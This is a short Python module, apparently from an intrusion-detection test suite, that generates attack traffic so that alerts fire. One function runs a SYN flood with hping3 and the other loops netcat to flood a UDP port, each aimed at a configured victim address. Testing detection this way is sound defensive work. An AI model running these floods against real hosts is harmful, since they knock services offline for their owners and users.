import os
import time
from helpers.config import (
    VICTIM_IP,
    PORT_TCP,
    PORT_UDP,
    DURATION
)
from utils.console_logger import log

def generate_syn_flood():
    """
    Perform a SYN flood attack using hping3. This should trigger an alert.
    """
    log("info", "Starting SYN flood attack on {VICTIM_IP}:{PORT_TCP}")
    command = f"hping3 --flood -S -p {PORT_TCP} {VICTIM_IP}"
    os.system(command)
    
    log("info", "SYN flood attack completed")
    
def generate_udp_flood():
    """
    Perform a UDP flood attack using netcat. This should trigger an alert.
    """
    log("info", "Starting UDP flood attack on {VICTIM_IP}:{PORT_UDP}")
    start_time = time.time()
    
    while time.time() - start_time < DURATION:
        os.system(f"echo 'Attack Packet' | nc -u -w1 -q0 {VICTIM_IP} {PORT_UDP}")
        time.sleep(0.1)
    
    log("info", "UDP flood attack completed")